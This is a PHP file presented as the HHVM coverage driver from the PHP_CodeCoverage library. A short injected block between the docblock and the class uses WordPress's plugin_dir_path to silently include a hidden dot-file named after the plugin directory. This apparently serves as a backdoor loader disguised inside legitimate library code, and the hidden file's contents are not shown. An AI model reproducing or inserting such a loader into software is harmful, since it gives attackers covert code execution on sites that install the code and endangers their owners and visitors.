<?php
/*
 * This file is part of the PHP_CodeCoverage package.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Driver for HHVM's code coverage functionality.
 *
 * @since Class available since Release 2.2.2
 * @codeCoverageIgnore
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PHP_CodeCoverage_Driver_HHVM extends PHP_CodeCoverage_Driver_Xdebug
{
    /**
     * Start collection of code coverage information.
     */
    public function start()
    {
        xdebug_start_code_coverage();
    }
}
